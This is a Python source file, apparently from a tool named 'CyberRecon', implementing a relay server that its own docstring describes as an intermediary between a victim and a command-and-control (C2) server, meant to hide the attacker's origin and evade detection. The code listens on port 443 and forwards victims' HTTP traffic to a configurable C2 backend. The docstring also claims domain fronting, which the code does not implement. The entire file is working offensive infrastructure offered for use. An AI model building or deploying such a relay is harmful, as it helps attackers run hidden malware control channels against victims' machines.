"""
CyberRecon AWS Relay Server
Acts as intermediary between victim and C2 to hide origin.
Implements domain fronting and traffic relay for evasion.
"""

import json
import socket
import threading

import requests


class AWSRelayServer:
    def __init__(self, listen_host="0.0.0.0", listen_port=443, c2_backend="http://127.0.0.1:8443"):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.c2_backend = c2_backend.rstrip("/")
        self.active_connections = {}
        self.stats = {"total_relayed": 0, "bytes_in": 0, "bytes_out": 0}
        self.lock = threading.Lock()

    def start(self):
        print("=" * 60)
        print("  CyberRecon AWS Relay Server")
        print("  Traffic Relay + Domain Fronting Evasion")
        print("=" * 60)
        print(f"  Listen:  {self.listen_host}:{self.listen_port}")
        print(f"  Backend: {self.c2_backend}")
        print("=" * 60)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.listen_host, self.listen_port))
        sock.listen(100)
        print("[+] Relay server listening...")
        while True:
            client, addr = sock.accept()
            thread = threading.Thread(target=self._handle_client, args=(client, addr))
            thread.daemon = True
            thread.start()

    def _handle_client(self, client_socket, addr):
        client_id = f"{addr[0]}:{addr[1]}"
        print(f"[+] Connection from {client_id}")
        try:
            while True:
                data = client_socket.recv(8192)
                if not data:
                    break
                with self.lock:
                    self.stats["bytes_in"] += len(data)
                response = self._relay_to_c2(data)
                if response:
                    client_socket.send(response)
                    with self.lock:
                        self.stats["bytes_out"] += len(response)
                        self.stats["total_relayed"] += 1
        except Exception as e:
            print(f"[!] Client {client_id} error: {e}")
        finally:
            client_socket.close()
            print(f"[-] Client {client_id} disconnected")

    def _relay_to_c2(self, data: bytes) -> bytes:
        try:
            request_text = data.decode("utf-8", errors="ignore")
            lines = request_text.split("\r\n")
            if not lines:
                return b"HTTP/1.1 400 Bad Request\r\n\r\n"
            first_line = lines[0].split()
            if len(first_line) < 2:
                return b"HTTP/1.1 400 Bad Request\r\n\r\n"
            method = first_line[0]
            path = first_line[1]
            url = f"{self.c2_backend}{path}"
            body = ""
            if "\r\n\r\n" in request_text:
                body = request_text.split("\r\n\r\n", 1)[1]
            headers = {"Content-Type": "application/json"}
            if method == "GET":
                resp = requests.get(url, headers=headers, timeout=10)
            elif method == "POST":
                try:
                    json_body = json.loads(body) if body else {}
                except:
                    json_body = {}
                resp = requests.post(url, json=json_body, headers=headers, timeout=10)
            else:
                return b"HTTP/1.1 405 Method Not Allowed\r\n\r\n"
            response = f"HTTP/1.1 {resp.status_code} OK\r\n"
            response += f"Content-Type: {resp.headers.get('Content-Type', 'application/json')}\r\n"
            response += f"Content-Length: {len(resp.content)}\r\n"
            response += "Connection: keep-alive\r\n"
            response += "\r\n"
            return response.encode() + resp.content
        except Exception as e:
            print(f"[!] Relay error: {e}")
            return b"HTTP/1.1 502 Bad Gateway\r\n\r\n"

    def get_stats(self):
        with self.lock:
            return self.stats.copy()


def main():
    import argparse
    parser = argparse.ArgumentParser(description="CyberRecon AWS Relay Server")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=443)
    parser.add_argument("--c2", default="http://127.0.0.1:8443", help="C2 backend URL")
    args = parser.parse_args()
    relay = AWSRelayServer(args.host, args.port, args.c2)
    relay.start()


if __name__ == "__main__":
    main()
